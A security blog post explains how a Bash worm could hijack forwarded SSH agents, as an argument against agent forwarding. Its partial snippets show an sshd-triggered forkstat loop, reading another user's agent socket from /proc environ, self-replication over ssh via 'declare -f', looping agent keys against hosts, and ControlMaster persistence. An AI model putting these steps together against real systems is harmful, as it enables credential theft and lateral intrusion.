---
pin: true
layout: post
title: "The Anatomy of a Bash SSH Worm"                                       
date: 2022-06-11
author: shawn
categories:                                         
  - automation
tags:
  - ssh
  - code
  - script
  - security
image:
  path: /static/img/Tremors_official_theatrical_poster.jpg
---

## Tremors

A few years ago, in the spirit of Facebook’s “code wins arguments”, I wanted to prove why forwarding ssh agents is generally bad (not unlike any other credential database someone may gain access to). I made my point with a simple shell script.

The shell script has not been, and will not be released publically. However, I’m going to show you how you may implement something similar in hopes that you’ll never forward ssh agents again (caveat: remote “desktop” environment that you trust) and maybe learn some interesting ideas or snippets. I am also hoping that no one releases code that actually does this nor tries to run something like it in a production environment (I don’t think anyone will enjoy that cleanup).

## What is a worm?

It’s just self replicating software. But then most services that fork are worms too? I think the definition we want in a true sense is a program that has: an initialization, the ability to persist/compute (probably running in a loop), and spawn itself. In order to pull this off, we need to understand: a protocol and an environment. 

We also kind of want our worm to have an r0 of >1, right? Like a virus. If there’s only one node running this and moving around a network when something terminates us, it’s the end of our run. Or if we run out of things to try on the last host, we have also come to an end. We don’t want to die - we want to live and be persistent. So we definitely want spawning.

## Security

I’m going to discuss things I think you shouldn’t do and things you may consider doing. Why do these features exist and I say you probably should/shouldn’t be using one feature over another? Because of my assessment of risk. Here’s my thinking:

SSH using a socket file for it’s keychain access is a feature. Control master socket files are also a feature. Forwarding agent sockets is a feature as well. All of these things are features and quite secure when used appropriately. 

The issue lies in when features are talked about and how they’re used. Everyone (reading this) runs ssh from a local computer/workstation - and the control master feature is perfect for connection handling on your single user workstation. While the only use for agent forwarding is to forward to a single user workstation - one that no one else has access to. That’s something most people don’t have and don’t seem to be doing with most agent forwarding.

If you go to work and develop/test software with a group of people on a shared instance (which is common) or you are setting up a bastion host for a group of people, you should not allow agent forwarding. If you’re pushing git commits as yourself on a shared server, that’s a bad idea - I’d either store different “server” credentials to be used on the host to push or setup sshfs to easily move files and run repo commands locally. If you’re trying to jump through a bastion host, use LocalForward to get the service of the host you want to use to show up on your local host.

## What do we have?

There are tons of articles from very large and popular companies like Microsoft (who owns GitHub) on agent forwarding:

[https://docs.github.com/en/developers/overview/using-ssh-agent-forwarding](https://docs.github.com/en/developers/overview/using-ssh-agent-forwarding)

And large shops with lots of people (both admins and developers) read articles like this and think it’s good to setup agent forwarding and have credential databases laying around on tons of servers.

This is great news! I have a single platform: Linux and generally a Bash like shell, and a single protocol: ssh, and a consistant automatic way to get the key database for each login. Wonderful! So the development pathway has been picked for me.

## Triggered

We’ve already figured out that we’re probably running in a loop of some sort, but we don’t want to be noisy either - it’s just bad software architecture at a minimum. Then issue is in timing though. Timing is everything, right? When and how to trigger our execute block?

We’re going to need good timing too: if we’re going to try to use an agent database, it’s really helpful if it’s already unlocked for us and people aren’t prompted for a pin/pass (if they even set that up). This means we’ll have maybe a minute from the point they login (if they were using a key) to try that key as many times as we like. We’ll also fit nicely in with other user type logs a bit better if we can get as close to agent creation as possible.

It seems there are two ways to do this and both require root: monitoring the filesystem for creation of the agent’s socket file, or looking for the execution of sshd. Different filesystems have different features that may or may not be enabled, so I didn’t really want to go down this path. However, I’m also not aware of a sysfs or other mechanism for listening for processes.

This means the only way for a worm to get new users to worm with is to have root access on a multi-user host. You can still worm around as a single user and maybe gain further hosts or other data, but it’s only really fun when you get someone with sudo.

We want to have an event loop that triggers on sshd spawning new user login processes then. This means we’re going to need to actually copy an executable to disk whereas there wouldn’t otherwise be a reason to do so. But we don’t need to actually write any C either. This nice short code does the trick just fine:

[https://github.com/ColinIanKing/forkstat](https://github.com/ColinIanKing/forkstat)

And so, with a bit of awk, we can trigger a loop based on an sshd execution event:

```shell
forkstat -s -l -e fork exec thread clone \
| awk '$4=="parent" && $5=="sshd" \
  {print $3; fflush(stdout) }' \
| while read f; do 
  ...
done
```

The forkstat is just looking for the types of system calls to report on. Those four: fork, exec, thread, clone, seemed to be the only 4 we care about here (and maybe we don’t need to see them all either - those just seem sane). Next awk is filtering for “parent” and the process name of “sshd” and printing the third “word” which is the PID that while gets sent. I then clear the buffer to assure it’s not waiting with half a line processed.

Next, we need to figure out where the socket file is stored. You can obviously just preform a find for it (which you may want a different mechanism to do if you can’t get sudo). However, that is fortunately stored as an environment variable for the sshd process we’re reading into our loop. We can find the file from there:

```shell
cat "/proc/$pid/environ" \
  | tr '\0' '\n' \
  | grep SSH_AUTH_SOCK \
  | cut -f2 -d'='
```

We then need the username who logged in. They may go as another name on different hosts, but people using the same username seems a decent enough guess. Grab this however you like - I prefer just looking at the ownership of the files in proc. You may also consider ways to harvest other usernames you may try like looking at /home directories or passwd or wtmp or searching logs etc. For my proof of concept, I just used the logged in user.

You can then export the auth socket file you’ve got like you normally would, and run ssh like normal (but as that user).

## R0

I’m now running fairly idly on a host computer and triggering every time someone ssh’s in, but I still need to worm. That’s the goal, right? To make sure I’m big and bad and run everywhere?

Unfortunately, the forkstat command isn’t very common, so I need to scp it over in order to run on a new host. However, with that aside, we can easily replicate a local bash function over ssh and don’t even need to touch a disk to run. If I declare a local bash function called _func, then I just do:

> ssh “${user}@${host}” “$(declare -f _func) && _func)”

And it runs my local function on a remote host. Which means, that we need to be running inside _func already so that we can call ourselves on the remote host and worm. What this looks like is:

```shell
#!/bin/bash

<local initialization>

_runner () {
  <remote initialization>
  _main
}

_main () {
  <local and remote initialization>
  <loop run>
    ssh host “$(declare -f _runner) && _runner”
}

_main
```

There are two bash features I should mention here. declare in a subshell and functions in functions. When you have text in a subshell, it is executed - or eval’d. That’s it. So $(declare -f _func) is making a local subshell where it’s unwrapping that function which gets executed on the remote host for us (and then we run it).

The second part is how bash handles runtime functions: it just defines them for you. In bash, functions can create functions - you just need to execute your function generator function. So if I have a check that I don’t intend to change over the run of the script, instead of calling it within a function, I can call the check in my function generator function and have it generate the same function for the rest of the script run to use:

```shell
some_func () {
  if [[ true ]]; then
    some_func () {
      echo “a”
      …
    }
  elif [[ less true ]]; then
    some_func () {
      echo “b”
    }
  fi
  
  some_func
}
```

You probably want to run the function at the end of your definition statement or the first run will look different from all other runs of your function.

## Persistance

We can worm around and run stuff, but that’s no fun if we can’t actually utilize the shell connections when we want to, right? This is where ssh’s ControlMaster comes in really handy. The control path is how we can create meaningful control master sockets per host. This type of thing makes our worm really shine when we go back and want to jump through hosts that it’s gotten connections to.

Here’s the arguments I’ve come up with (as it’s really useful for day to day work as well):

```console
ssh_opts=" \
  -o PasswordAuthentication=no \
  -o ServerAliveInterval=300 \
  -o ControlPath=~/.ssh/control-%r@%h:%p \
  -o ControlPersist=yes \
  -o ControlMaster=yes \
"
```

You may also consider keeping agent forwarding enabled so you may use those keys on the next host. However, that’s probably not a good example to post.

## Blocking

We are now firing off ssh and getting into other computers. But still only one at a time. This is because ssh is running and waiting to exit before moving on. We can’t have that.

There are two things to consider here: login/key check process, and actual infection. We’re using a control master, so we only need to be successful with a login once and then everything else will just work through that socket (as long as we use the same configuration/arguments). But we do need to block on each host as we’re trying to loop through keys to get in.

We can list keys using ssh-add -L and we can try a login with a key and assess whether a login works like this:

```console
ssh host \
  -o “IdentityFile=$key” \
  -o “IdentitiesOnly=yes” \
  “echo $?”
```

After this check/attempt succeeds, we just need to do our setup and run. We don’t need to care what key was successful (ssh creates our control master for access anyway) and we don’t need any other data back from the new victim host either - it either worked or it didn’t.

The meta code for this whole thing (with a backgrounded bash code block) looks like:

```shell
for host in ${hosts[@]; do
  for key in ${keys[@]; do
    if [[ ssh “$host” -o “IdentityFile=$key” echo $? ]]; then
      ( \
        # push payload and run
      ) &
    fi
  done
done
```

It may be useful to keep track of what keus and users were attempted on each host and from which client. It may be useful to go back and try new keys you find on old hosts, etc. But at this point in the script, the point has been well proven out - there’s no business reason to move forward with this script (for any business I’ve worked at anyway).

## Features

We’re still only stuck with the one host or set of hosts we provided at the start. This is uninteresting. And besides, the general (and wrong) use of agent forwarding is in order to jump through a “jump box” or bastion server. Which also means that your work may be looking at a totally different network than what you expected.

So, within your _func, you should probably try to mine hosts. You may look in ssh’s config (but only look at the address as Host matches can contain wildcards). We can also look in /etc/hosts along with any dns zones. Looking at existing socket connections can also be useful. At this point, it’s a question of how much noise you might create vs the number of sources you can mine.

If you’re running on a box, you might as well check for anyone’s authorized_keys and send them to all your running worms too. This means that you’ll need a routine to find your control master sockets and use them to update clients.

SSH servers are often setup to fail after trying the third key. But you’re running in a script, so you should just specify and loop through keys. This generally won’t cause too much noise anyway as most ssh servers aren’t running with debug logging enabled (but maybe there’s a Splunk dashboard on the other end with a per user login attempt counter too).

## Final

I think that’s pretty much it. It’s not a very hard script to write. I assume you can do similar with Windows or OSX services and keychains and password vaults. But since I do Unix admin work, this is the script I wrote (I may go back and try to do this for OSX and Windows - could be fun). I hope my script isn’t improved on and that Microsoft/Github consider the documentation they release and how it impacts the security landscape.

I’ve written/given a presentation on bash with most of these ideas in it. The presentation was made using a javascript library, so no extra software is required to view it:
[https://ag4ve.github.io/bash-patterns/#/](https://ag4ve.github.io/bash-patterns/#/)


Update 1

I covered what I feel is an acceptible use of ssh agent forwarding as part of a write-up. I assume there that a local VirtualBox VM is for a single (local) user:
[https://ag4ve.blogspot.com/2019/04/linux-easily-native-desktop-environment.html](https://ag4ve.blogspot.com/2019/04/linux-easily-native-desktop-environment.html)

